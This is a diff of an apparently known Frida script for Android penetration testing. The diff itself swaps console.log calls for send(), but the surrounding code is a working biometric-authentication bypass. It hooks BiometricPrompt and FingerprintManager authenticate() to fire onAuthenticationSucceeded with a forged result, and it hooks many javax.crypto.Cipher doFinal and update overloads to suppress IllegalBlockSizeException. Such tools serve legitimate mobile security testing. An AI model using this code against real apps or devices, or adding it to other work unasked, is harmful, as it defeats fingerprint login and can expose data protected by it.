@@ -10,13 +10,14 @@
 
 */
 
-console.log("Fingerprint hooks loaded!");
+send("Fingerprint hooks loaded!");
 
 Java.perform(function () {
+    send("Attached")
 
     //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
-    try {hookBiometricPrompt_authenticate();} catch (error){console.log("hookBiometricPrompt_authenticate not supported on this android version")}
-    try {hookBiometricPrompt_authenticate2();} catch (error){console.log("hookBiometricPrompt_authenticate not supported on this android version")}
+    try {hookBiometricPrompt_authenticate();} catch (error){send("hookBiometricPrompt_authenticate not supported on this android version")}
+    try {hookBiometricPrompt_authenticate2();} catch (error){send("hookBiometricPrompt_authenticate not supported on this android version")}
     
     //hookFingerprintManagerCompat_authenticate();
     hookFingerprintManager_authenticate();
@@ -53,9 +54,9 @@ Java.perform(function () {
 function hookBiometricPrompt_authenticate()
 {
     var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
-    console.log("Hooking BiometricPrompt.authenticate()...");
+    send("Hooking BiometricPrompt.authenticate()...");
     biometricPrompt.implementation = function(cancellationSignal,executor,callback) {
-        console.log("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);
+        send("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);
 
         var sweet_cipher=null;
         var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
@@ -63,7 +64,7 @@ function hookBiometricPrompt_authenticate()
         
         var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
         authenticationResultInst = authenticationResultObj.$new(cryptoInst,null,0);
-        console.log("cryptoInst:, " + cryptoInst + " class: "+ cryptoInst.$className);
+        send("cryptoInst:, " + cryptoInst + " class: "+ cryptoInst.$className);
 
         callback.onAuthenticationSucceeded(authenticationResultInst);  
         //return this.authenticate(cancellationSignal,executor,callback);
@@ -74,9 +75,9 @@ function hookBiometricPrompt_authenticate()
 function hookBiometricPrompt_authenticate2()
 {
     var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
-    console.log("Hooking BiometricPrompt.authenticate2()...");
+    send("Hooking BiometricPrompt.authenticate2()...");
     biometricPrompt.implementation = function(crypto,cancellationSignal,executor,callback) {
-       console.log("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto+ ", cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);
+       send("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto+ ", cancellationSignal: " + cancellationSignal +", executor: "+ ", callback: "+ callback);
 
 
         
@@ -118,17 +119,17 @@ function hookFingerprintManagerCompat_authenticate()
     }
     if(fingerprintManagerCompat == null)
     {
-        console.log("FingerprintManagerCompat class not found!");
+        send("FingerprintManagerCompat class not found!");
         return;
     }
-    console.log("Hooking FingerprintManagerCompat.authenticate()...");
+    send("Hooking FingerprintManagerCompat.authenticate()...");
     var fingerprintManagerCompat_authenticate = fingerprintManagerCompat['authenticate'];
     fingerprintManagerCompat_authenticate.implementation = function(crypto,flags, cancel, callback, handler) {
-        console.log("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: "+ flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: "+ handler );
-        //console.log(enumMethods(callback.$className));
+        send("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: "+ flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: "+ handler );
+        //send(enumMethods(callback.$className));
         // Hook onAuthenticationFailed
         callback['onAuthenticationFailed'].implementation = function() {
-            console.log("[onAuthenticationFailed()]:" );
+            send("[onAuthenticationFailed()]:" );
 
 
            
@@ -173,14 +174,14 @@ Error: authenticate(): has more than one overload, use .overload(<signature>) to
     }
     if(fingerprintManager == null)
     {
-        console.log("FingerprintManager class not found!");
+        send("FingerprintManager class not found!");
         return;
     }
-    console.log("Hooking FingerprintManager.authenticate()...");
+    send("Hooking FingerprintManager.authenticate()...");
 
     var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
     fingerprintManager_authenticate.implementation = function(crypto,cancel, flags, callback, handler) {
-        console.log("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: "+ flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: "+ handler );
+        send("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: "+ flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: "+ handler );
         
         authenticationResultInst = authenticationResultObj.$new(crypto,null,0);
         callbackG = Java.retain(callback);
@@ -228,7 +229,7 @@ function bypass()
                             } 
                             catch (error)
                             {
-                                console.log("exception catched!" + error  ); 
+                                send("exception catched!" + error  ); 
                             }
                         }
                 }
@@ -241,7 +242,7 @@ function bypass()
             handler.post(Runner.$new());
 
         } catch (e) {
-            console.log("registerClass error3 >>>>>>>> " + e);
+            send("registerClass error3 >>>>>>>> " + e);
         }
 
     });
@@ -252,14 +253,14 @@ function hookDoFinal()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload() ;
     var tmp = null;
     cipherInit.implementation = function() {
-        console.log("[Cipher.doFinal()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal()]: "+ "  cipherObj: "+this);
         
         try{  
             tmp = this.doFinal();
         }
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -276,13 +277,13 @@ function hookDoFinal2()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr) {
-        console.log("[Cipher.doFinal2()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal2()]: "+ "  cipherObj: "+this);
         try{  
             tmp = this.doFinal(byteArr);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -299,13 +300,13 @@ function hookDoFinal3()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1) {
-        console.log("[Cipher.doFinal3()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal3()]: "+ "  cipherObj: "+this);
         try{ 
             tmp = this.doFinal(byteArr, a1);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -322,13 +323,13 @@ function hookDoFinal4()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer') ;
     var tmp = null;
     cipherInit.implementation = function(a1, a2) {
-        console.log("[Cipher.doFinal4()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal4()]: "+ "  cipherObj: "+this);
         try{          
             tmp = this.doFinal(a1, a2);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -346,13 +347,13 @@ function hookDoFinal5()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2) {
-        console.log("[Cipher.doFinal5()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal5()]: "+ "  cipherObj: "+this);
         try{ 
             tmp = this.doFinal(byteArr, a1, a2);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -369,13 +370,13 @@ function hookDoFinal6()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2, outputArr) {
-        console.log("[Cipher.doFinal6()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal6()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.doFinal(byteArr, a1, a2, outputArr);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -393,13 +394,13 @@ function hookDoFinal7()
     var cipherInit = Java.use('javax.crypto.Cipher')['doFinal'].overload('[B', 'int', 'int', '[B', 'int') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2, outputArr, a4) {
-        console.log("[Cipher.doFinal7()]: "+ "  cipherObj: "+this);
+        send("[Cipher.doFinal7()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.doFinal(byteArr, a1, a2, outputArr, a4);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -424,13 +425,13 @@ function hookUpdate()
     var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr) {
-        console.log("[Cipher.update()]: "+ "  cipherObj: "+this);
+        send("[Cipher.update()]: "+ "  cipherObj: "+this);
         try{        
             tmp = this.update(byteArr);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -447,13 +448,13 @@ function hookUpdate2()
     var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('java.nio.ByteBuffer', 'java.nio.ByteBuffer') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, outputArr) {
-        console.log("[Cipher.update2()]: "+ "  cipherObj: "+this);
+        send("[Cipher.update2()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.update(byteArr, outputArr);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -470,13 +471,13 @@ function hookUpdate3()
     var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2) {
-        console.log("[Cipher.update3()]: "+ "  cipherObj: "+this);
+        send("[Cipher.update3()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.update(byteArr, a1, a2);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -493,13 +494,13 @@ function hookUpdate4()
     var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2, outputArr) {
-        console.log("[Cipher.update4()]: "+ "  cipherObj: "+this);
+        send("[Cipher.update4()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.update(byteArr, a1, a2, outputArr );
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
@@ -516,13 +517,13 @@ function hookUpdate5()
     var cipherInit = Java.use('javax.crypto.Cipher')['update'].overload('[B', 'int', 'int', '[B', 'int') ;
     var tmp = null;
     cipherInit.implementation = function(byteArr, a1, a2, outputArr, a4) {
-        console.log("[Cipher.update5()]: "+ "  cipherObj: "+this);
+        send("[Cipher.update5()]: "+ "  cipherObj: "+this);
         try{
             tmp = this.update(byteArr, a1, a2, outputArr, a4);
         } 
         catch (error)
         {
-            console.log("exception catched! " + error  ); 
+            send("exception catched! " + error  ); 
             if((error+"").indexOf("javax.crypto.IllegalBlockSizeException")==-1) 
                 throw error;
             else
